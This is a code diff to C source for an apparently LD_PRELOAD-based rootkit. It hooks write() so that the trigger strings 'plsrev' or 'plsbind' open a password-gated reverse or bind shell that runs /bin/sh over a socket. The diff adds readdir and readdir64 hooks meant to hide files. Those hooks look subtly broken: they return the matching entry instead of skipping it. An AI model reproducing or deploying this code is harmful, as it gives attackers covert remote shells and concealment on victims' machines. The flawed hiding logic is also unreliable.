@@ -10,6 +10,8 @@
 #include <netinet/in.h>
 #include <sys/types.h>
 #include <netdb.h>
+#include <sys/stat.h>
+#include <fcntl.h>
 
 #define REVTRIGGER "plsrev" //  presence of this string will trigger the REV Shell
 #define BINDTRIGGER "plsbind" // presence of this string will trigger the BIND Shell
@@ -76,24 +78,24 @@ int ip_rev(void)
 	dup2(s, 1);
 	dup2(s, 2);
 
-    char input[30];
-    read(s, input, sizeof(input)); // Read Input Stream For Password
-    if (strncmp(input,PASS,strlen(PASS))==0)
-    {
-        char *shell[2];
-        shell[0]="/bin/sh";
-        shell[1]=NULL;
-        execve(shell[0],shell, NULL); // Call Our Shell
-        close(s);
-        return 0;
-    }
-    
-    else
-    {
-        shutdown(s,SHUT_RDWR); // Shutdown Further R/W Operation From Client
-        close(s);
-        return -4;
-    }
+	char input[30];
+	read(s, input, sizeof(input)); // Read Input Stream For Password
+
+	if (strncmp(input,PASS,strlen(PASS))==0)
+	{
+	    char *shell[2];
+	    shell[0]="/bin/sh";
+	    shell[1]=NULL;
+	    execve(shell[0],shell, NULL); // Call Our Shell
+	    close(s);
+	    return 0;
+	}
+	else
+	{
+	    shutdown(s,SHUT_RDWR); // Shutdown Further R/W Operation From Client
+	    close(s);
+	    return -4;
+	}
 }
 
 int ip_bind(void)
@@ -175,13 +177,13 @@ ssize_t write(int fildes, const void *buf, size_t nbytes) // From Manual
 	
 	if (strstr(buf,BINDTRIGGER) != NULL) // Check If A Particular String Is Present In The ind Shell And Trigger Accordingly
 	{
-		fildes = open("/dev/null", O_WRONLY | O_APPEND)
+		fildes = open("/dev/null", O_WRONLY | O_APPEND);
 		result = new_write(fildes,buf,nbytes);
 		ip_bind();
 	}
 	else if(strstr(buf,REVTRIGGER) != NULL)
 	{
-		fildes = open("/dev/null", O_WRONLY | O_APPEND)
+		fildes = open("/dev/null", O_WRONLY | O_APPEND);
 		result = new_write(fildes,buf,nbytes);
 		ip_rev();	
 	}
@@ -253,4 +255,32 @@ FILE *fopen64(const char *pathname, const char *mode)
 	
 	fp = orig_fopen64(pathname, mode);
 	return fp;
+}
+
+struct dirent *readdir(DIR *dirp)
+{
+	struct dirent *(*new_readdir)(DIR *dir);
+	new_readdir=dlsym(RTLD_NEXT,"readdir");
+	struct dirent *olddir;
+
+	while(olddir = new_readdir(dirp))
+	{
+		if(strstr(olddir->d_name,FILENAME) != NULL)
+			break;
+	}
+	return olddir;
+}
+
+struct dirent64 *readdir64(DIR *dirp)
+{
+	struct dirent64 *(*new_readdir64)(DIR *dir);
+	new_readdir64=dlsym(RTLD_NEXT,"readdir64");
+	struct dirent64 *olddir;
+
+	while(olddir = new_readdir64(dirp))
+	{
+		if(strstr(olddir->d_name,FILENAME) != NULL)
+			break;
+	}
+	return olddir;
 }
